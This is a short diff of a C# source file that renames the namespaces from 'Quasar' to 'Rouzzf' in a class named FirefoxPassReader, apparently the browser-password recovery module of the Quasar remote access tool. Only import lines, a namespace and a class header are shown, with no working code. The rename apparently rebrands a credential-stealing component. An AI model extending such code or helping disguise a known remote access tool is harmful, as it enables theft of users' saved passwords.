@@ -1,12 +1,12 @@
-﻿using Quasar.Client.Helper;
-using Quasar.Client.Recovery.Utilities;
-using Quasar.Common.Models;
+﻿using Rouzzf.Client.Helper;
+using Rouzzf.Client.Recovery.Utilities;
+using Rouzzf.Common.Models;
 using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Runtime.Serialization;
 
-namespace Quasar.Client.Recovery.Browsers
+namespace Rouzzf.Client.Recovery.Browsers
 {
     public class FirefoxPassReader : IAccountReader
     {
